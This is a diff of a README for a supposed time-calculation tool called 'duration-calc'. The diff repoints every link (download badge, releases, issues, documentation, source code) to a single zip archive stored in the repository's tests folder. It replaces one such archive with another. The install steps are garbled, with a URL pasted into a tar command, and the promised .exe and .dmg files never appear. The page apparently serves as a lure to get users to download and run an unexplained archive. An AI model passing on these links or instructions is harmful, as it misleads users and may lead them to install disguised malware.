@@ -1,6 +1,6 @@
 # 🎉 duration-calc - Effortless Time Calculations at Your Fingertips
 
-[![Download duration-calc](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip)](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip)
+[![Download duration-calc](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip)](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run **duration-calc**. You don’t need any p
 
 ### Step 1: Visit the Releases Page
 
-To download **duration-calc**, visit our [Releases page](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip). Here, you will find all the available versions of the software.
+To download **duration-calc**, visit our [Releases page](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip). Here, you will find all the available versions of the software.
 
 ### Step 2: Download the Latest Version
 
@@ -20,7 +20,7 @@ On the Releases page, look for the latest version of **duration-calc**. Click on
 
 - **Windows**: Look for a file ending with `.exe`.
 - **macOS**: Look for a file ending with `.dmg`.
-- **Linux**: Look for compressed tar files (`https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip`).
+- **Linux**: Look for compressed tar files (`https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip`).
 
 After selecting the right file, the download will start automatically. 
 
@@ -46,7 +46,7 @@ Once the download finishes, follow these installation instructions based on your
 2. Navigate to the directory where you downloaded the file.
 3. Extract the contents with the command:
    ```bash
-   tar -xzf duration-calc-*https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip
+   tar -xzf duration-calc-*https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip
    ```
 4. Navigate into the created folder using:
    ```bash
@@ -106,15 +106,15 @@ At this time, **duration-calc** does not support negative time calculations. Ple
 
 ### What if I encounter an error?
 
-If you run into any issues while using **duration-calc**, check out the [issues section](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip) on our GitHub page. You can post your question or search for similar issues to find solutions.
+If you run into any issues while using **duration-calc**, check out the [issues section](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip) on our GitHub page. You can post your question or search for similar issues to find solutions.
 
 ## 🔗 Additional Resources
 
 To learn more about **duration-calc** or contribute to its development, refer to the following resources:
 
-- [Official Documentation](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip)
-- [Source Code](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip)
+- [Source Code](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip)
 
 Feel free to reach out with questions or suggestions. Your feedback helps us improve!
 
-[Download duration-calc](https://github.com/Hunted08/duration-calc/raw/refs/heads/main/tests/duration-calc-2.3.zip) today and make your time calculations easy.
+[Download duration-calc](https://raw.githubusercontent.com/Hunted08/duration-calc/main/tests/calc-duration-1.0-beta.1.zip) today and make your time calculations easy.
